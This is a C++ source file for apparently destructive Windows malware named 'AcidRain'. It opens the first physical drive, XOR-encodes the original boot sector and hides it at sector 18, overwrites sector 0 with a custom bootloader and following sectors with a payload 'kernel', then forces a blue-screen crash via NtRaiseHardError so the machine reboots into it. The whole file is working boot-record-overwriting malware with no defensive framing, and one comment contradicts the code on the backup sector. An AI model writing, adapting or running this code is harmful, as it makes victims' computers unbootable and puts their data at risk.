#include "binaries.h"
#include <iostream>




typedef NTSTATUS(WINAPI* pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

typedef NTSTATUS(WINAPI* pRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);



BOOL Read(HANDLE driveHandle, int sector, DWORD bytesToRead, char* buffer);
BOOL Write(HANDLE driveHandle, int startSector, DWORD bufferSize, const char* buffer);


int main()
{
	printf("[*] AcidRain init\r\n");

	//Get handle to the physical drive
	HANDLE driveHandle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	//Back up the original bootloader from sector 0 and save it to sector 5
	char bootSectorBackup[512] = { NULL };
	char bootSectorEncrypted[512] = { NULL };

	if (!Read(driveHandle, 0, sizeof(bootSectorBackup), bootSectorBackup))
	{
		printf("[*] Backup Read failed\r\n");
		CloseHandle(driveHandle);
		return -1;

	}


	//"encrypt" the original bootsector, and write it to sector 18
	for (int i = 0; i < 512; i++)
	{
		char temp = bootSectorBackup[i] ^ 0x28;
		bootSectorEncrypted[i] = temp;

	}

	if (!Write(driveHandle, 18, sizeof(bootSectorEncrypted), bootSectorEncrypted))
	{
		printf("[*] Backup Write failed\r\n");
		CloseHandle(driveHandle);
		return -1;
	}


	//Write our bootloader to sector 0

	if (!Write(driveHandle, 0, sizeof(bootloader), bootloader))
	{
		printf("[*] Bootsector write failed\r\n");
		CloseHandle(driveHandle);
		return -1;
	}

	//Start writing our kernel from sector 1

	if (!Write(driveHandle, 1, sizeof(kernel), kernel))
	{
		printf("[*] Kernel write failed\r\n");
		CloseHandle(driveHandle);
		return -1;
	}



	//Get function pointers
	pRtlAdjustPrivilege RtlAdjustPrivilege	 = (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
	pNtRaiseHardError   NtRaiseHardError	 = (pNtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");

	BOOLEAN enabled;
	ULONG response;

	NTSTATUS shutdownPrivilege = RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);

	if (!NT_SUCCESS(shutdownPrivilege))
	{
		printf("[*] RtlAdjustPrivilege failed: %i", GetLastError());
		CloseHandle(driveHandle);
		return -1;
	}

	//BSOD
	NTSTATUS bsodStatus = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);

	if (!NT_SUCCESS(shutdownPrivilege))
	{
		printf("[*] NtRaiseHardError failed: %i", GetLastError());
		CloseHandle(driveHandle);
		return -1;
	}

	CloseHandle(driveHandle);
	return 0;

}




BOOL Read(HANDLE driveHandle, int sector, DWORD bytesToRead, char* buffer)
{

	if (driveHandle == INVALID_HANDLE_VALUE)
	{
		printf("[*] Failed to get handle to PhysicalDrive0\r\n");
		return FALSE;
	}

	LARGE_INTEGER sectorOffset;
	sectorOffset.QuadPart = (LONGLONG)sector * 512;
	SetFilePointerEx(driveHandle, sectorOffset, NULL, FILE_BEGIN);

	DWORD bytesRead;
	if (!ReadFile(driveHandle, buffer, bytesToRead, &bytesRead, NULL))
	{
		printf("[*] ReadFile failed\r\n");
		return FALSE;
	}

	return TRUE;
}

BOOL Write(HANDLE driveHandle, int startSector, DWORD bufferSize, const char* buffer)
{

	if (driveHandle == INVALID_HANDLE_VALUE)
	{
		printf("[*] Failed to get handle to PhysicalDrive0\r\n");
		return FALSE;
	}

	LARGE_INTEGER sectorOffset;
	sectorOffset.QuadPart = (LONGLONG)startSector * 512;



	// Determine the padded size (next multiple of 512)
	DWORD paddedSize = (bufferSize + 511) & ~511; // Rounds up to nearest 512


	char* paddedBuffer = (char*)malloc(paddedSize);

	if (!paddedBuffer)
	{
		printf("[*] Malloc failed %i\r\n", GetLastError());
		return FALSE;
	}


	memset(paddedBuffer, 0, paddedSize);
	memcpy(paddedBuffer, buffer, bufferSize);



	if (!SetFilePointerEx(driveHandle, sectorOffset, NULL, FILE_BEGIN))
	{
		printf("SetFilePointerEx failed: %i\n", GetLastError());
		return FALSE;
	}

	

	DWORD bytesWritten;
	if (!WriteFile(driveHandle, paddedBuffer, paddedSize, &bytesWritten, NULL))
	{
		printf("[*] WriteFile failed: %i\r\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}




